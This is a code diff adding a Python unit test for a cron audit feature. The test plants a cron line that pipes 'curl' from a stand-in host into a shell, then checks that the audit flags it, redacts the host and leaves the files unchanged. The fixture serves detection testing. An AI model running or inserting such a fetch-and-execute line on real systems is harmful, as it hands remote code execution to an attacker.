@@ -72,6 +72,25 @@ class ManagementTests(unittest.TestCase):
         self.assertEqual(m.config()['baselines']['example.com']['files'], 1)
         self.assertNotIn('example.com', m.config()['autorepair'])
 
+    def test_cron_audit_reports_suspicious_patterns_without_changing_sources(self):
+        cron_root = self.base / 'cron'
+        cron_root.mkdir()
+        source = cron_root / 'daily-task'
+        content = b'#!/bin/sh\n0 * * * * root curl https://bad.example/payload | bash\n'
+        source.write_bytes(content)
+        outside = cron_root / 'outside'
+        outside.write_text('*/5 * * * * root echo safe\n')
+        link = cron_root / 'linked-cron'
+        link.symlink_to(outside)
+        with mock.patch.object(m, 'CRON_FILES', (source,)), \
+                mock.patch.object(m, 'CRON_DIRS', (cron_root,)):
+            result = m.cron_audit()
+        self.assertEqual(result['finding_count'], 1)
+        self.assertEqual(result['findings'][0]['rule'], 'remote-shell-pipe')
+        self.assertNotIn('bad.example', json.dumps(result))
+        self.assertEqual(source.read_bytes(), content)
+        self.assertTrue(link.is_symlink())
+
     def test_repair_preserves_original_and_rollback_refuses_user_changes(self):
         self.write_site('index.php', b'GOOD')
         os.chmod(self.web / 'index.php', 0o600)
